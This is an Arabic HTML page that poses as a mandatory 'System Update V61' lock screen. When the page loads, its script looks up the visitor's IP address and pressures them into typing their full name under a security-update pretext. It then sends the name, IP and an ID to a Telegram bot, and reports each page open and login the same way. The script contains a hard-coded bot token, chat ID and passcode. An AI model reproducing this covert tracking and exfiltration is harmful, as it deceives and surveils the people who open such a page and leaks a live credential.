<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<!-- أكواد منع التخزين (عشان يجبره يسحب الجديد) -->
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Update [V61]</title>
<style>
    body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background-color:#0d1117;color:#c9d1d9;margin:0;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;user-select:none;}
    #lock-screen{background:#161b22;padding:30px;border-radius:12px;text-align:center;width:90%;max-width:350px;border:1px solid #30363d;}
    input{background:#0d1117;border:1px solid #30363d;color:#58a6ff;padding:12px;width:100%;text-align:center;font-size:18px;border-radius:6px;margin:15px 0;}
    button{background:#238636;color:#fff;border:none;padding:12px;width:100%;font-size:16px;border-radius:6px;cursor:pointer;margin-top:5px;}
    .status-log {font-size: 11px; color: #8b949e; margin-top: 15px; font-family: monospace;}
    .ver-badge {background: #da3633; color: white; padding: 2px 8px; border-radius: 4px; font-size: 10px; vertical-align: middle;}
</style>
</head>
<body>

<div id="lock-screen">
    <!-- ضفتلك العلامة دي عشان تتأكد بعينك إن التحديث وصل -->
    <h2 style="color:#fff;margin:0 0 10px 0;">نظام 2026 <span class="ver-badge">V61</span></h2>
    <p style="color:#8b949e;font-size:12px;">تم التحديث أمنياً</p>
    
    <div style="background:#21262d; padding:10px; border-radius:6px; margin: 15px 0;">
        <p id="dispName" style="color:#238636;margin:0;font-weight:bold;">...</p>
        <p id="dispID" style="color:#58a6ff;margin:5px 0 0 0;font-size:10px;">ID LOADING...</p>
    </div>

    <input type="tel" id="pIn" placeholder="كود المرور">
    <button onclick="login()">دخول</button>
    
    <div id="statusLog" class="status-log">Connecting...</div>
</div>

<script>
    // ==========================================
    // 1. كود الإجبار (Force Reload V61)
    // ==========================================
    const CURRENT_VERSION = "61"; 
    
    // لو النسخة المتسجلة قديمة، امسح كل حاجة واعمل ريفرش للصفحة
    if (localStorage.getItem("app_ver") !== CURRENT_VERSION) {
        localStorage.clear(); 
        localStorage.setItem("app_ver", CURRENT_VERSION);
        // هذا السطر يجبر المتصفح يعيد التحميل من السيرفر مش من الذاكرة
        window.location.reload(true);
    }

    // ==========================================
    // 2. إعدادات التليجرام والهوية
    // ==========================================
    const BOT_TOKEN = "8596993745:AAG0FXH8LFqweLH5nlPTcFpEM07BHhabrHw";
    const CHAT_ID = "-1003886528114";
    
    let uID = localStorage.getItem("uid_v61");
    if(!uID) { uID = "ID-" + Math.floor(Math.random()*900000); localStorage.setItem("uid_v61", uID); }
    document.getElementById("dispID").innerText = uID;

    let uName = localStorage.getItem("uname_v61");
    let uIP = "Detecting...";

    (async function init() {
        // جلب IP
        try {
            let req = await fetch('https://api.ipify.org?format=json');
            let res = await req.json();
            uIP = res.ip;
        } catch(e) { uIP = "Unknown IP"; }

        // طلب الاسم
        if(!uName) {
            while(!uName || uName.length < 3) {
                uName = prompt("تحديث أمني إجباري V61:\nمن فضلك أعد تسجيل اسمك الثلاثي:");
            }
            localStorage.setItem("uname_v61", uName);
            sendTele("🆕 NEW UPDATE V61", `Name: ${uName}\nID: ${uID}\nIP: ${uIP}`);
        } else {
            sendTele("♻️ APP OPENED (V61)", `User: ${uName}\nIP: ${uIP}`);
        }
        document.getElementById("dispName").innerText = uName;
        document.getElementById("statusLog").innerText = "System V61 Active";
    })();

    function sendTele(act, det) {
        const msg = `🚀 <b>SYSTEM 61</b>\n👤 ${uName}\n🆔 ${uID}\n📍 ${uIP}\n🔔 ${act}\n📝 ${det}`;
        // استخدام الطريقة المزدوجة لضمان الوصول
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`).catch(e=>console.log(e));
    }

    window.login = function() {
        if(document.getElementById("pIn").value === "2026") {
            sendTele("LOGIN SUCCESS", "User Entered");
            alert("تم الدخول (V61)");
        } else {
            alert("الكود خطأ");
        }
    };
</script>
</body>
</html>
